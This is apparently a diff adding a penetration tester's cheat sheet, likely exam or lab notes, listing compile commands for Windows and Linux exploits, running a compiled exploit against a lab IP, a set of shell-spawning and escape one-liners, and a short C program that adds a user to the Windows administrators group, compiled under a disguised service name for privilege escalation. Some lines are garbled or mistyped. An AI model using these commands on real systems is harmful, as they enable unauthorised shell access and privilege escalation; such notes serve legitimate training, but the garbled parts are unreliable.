@@ -1,0 +1,59 @@
+wine 646.exe ip
+-------------------------------------
+gcc -m32 -o output32 hello.c (32 bit)
+gcc -m64 -o output hello.c (64 bit)
+---------------
+process.h, string.h, winbase.h, windows.h, winsock2.h
+Windows exploit code
+
+arpa/inet.h, fcntl.h, netdb.h, netinet/in.h, 
+ sys/sockt.h, sys/types.h, unistd.h
+Linux exploit code
+---------------
+gcc -o exploit exploit.c
+gcc -m32 exploit.c -o exploit
+i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
+gcc -o suid suid.c
+gcc -m32 -o suid suid.c
+---------------------------
+shells
+python -c 'import pty;pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+exec "/bin/sh";
+perl —e 'exec "/bin/sh";'
+exec "/bin/sh"
+os.execute('/bin/sh')
+:!bash
+!sh
+
+x86_64-w64-mingw32-gcc shell.c -o shell.exe
+
+i686-w64-mingw32-gcc shell.c -o shell.exe
+
+ms32
+
+apt-cache search mingw-w64
+
+standalone  orbitals
+PYTHON and execute
+
+apt-get install mingw-w64
+
+i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o 646.exe
+ wine 646.exe 10.11.1.35 
+
+dos2unix
+
+HconSTFPortable
+
+i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+
+
+root@kali:~# cat useradd.c  #include <stdlib.h>     /* system, NULL, EXIT_FAILURE */  
+int main () {   int i;   i=system ("net localgroup administrators low /add");   return 0; }
+root@kali:~# i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c
+
+pg 214
+
+
